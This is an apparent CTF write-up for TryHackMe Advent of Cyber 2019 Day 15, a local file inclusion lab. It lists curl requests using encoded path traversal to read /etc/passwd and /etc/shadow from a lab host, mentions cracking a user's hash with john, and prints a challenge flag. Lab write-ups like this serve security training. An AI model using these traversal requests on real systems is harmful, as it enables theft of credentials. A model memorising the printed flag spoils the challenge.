---
title: "TryHackMe Advent of Cyber 2019 Day 15"
date: 2019-12-15
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2019"
event_day: "Day 15"
permalink: "/writeups/advent-of-cyber/adventofcyber-2019-day-15/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2019
  - day-15
---

# LFI Notes

```text
nmap
22
80
```

```text
http://10.10.107.83         --in source code
<script src="/js/jquery.min.js"></script>
    <script src="/js/bootstrap.min.js"></script>
    <script>
      function getNote(note, id) {
        const url = '/get-file/' + note.replace(/\//g, '%2f')
        $.getJSON(url,  function(data) {
          document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
        })
      }
      // getNote('server.js', '#note-1')
      getNote('views/notes/note1.txt', '#note-1')
      getNote('views/notes/note2.txt', '#note-2')
      getNote('views/notes/note3.txt', '#note-3')
    </script>
```

```text
we can see to view a page we need to change / with %2f
exploiting that with LFI
curl http://10.10.107.83/get-file/views%2fnotes%2fnote1.txt     ---[redacted] notes
curl http://10.10.107.83/get-file/..%2f..%2f..%2fetc%2fpasswd  --got LFI and users
curl http://10.10.107.83/get-file/..%2f..%2f..%2fetc%2fshadow   --also password of charlie
''''
```
crack password withn john
charlie:[redacted]
```text
[redacted sensitive answer]
```
Hawaii     -via note3
```text
2. Read /etc/shadow and crack Charlies password.
```
[redacted]
```text
[redacted sensitive answer]
```
THM{4ea2adf842713ad3ce0c1f05ef12256d}
```text
=============================================
```
